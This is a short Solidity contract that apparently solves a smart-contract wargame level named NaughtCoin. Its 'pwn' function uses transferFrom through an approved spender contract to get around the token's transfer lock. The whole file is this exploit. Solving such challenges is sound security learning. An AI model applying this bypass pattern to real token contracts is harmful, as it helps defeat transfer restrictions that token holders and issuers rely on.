// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface INaughtCoin {
    function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
}

contract NaughtCoinSpender {

    function pwn(address _coin, uint256 _value) external {
        INaughtCoin(_coin).transferFrom(msg.sender, address(this), _value);
    }

}
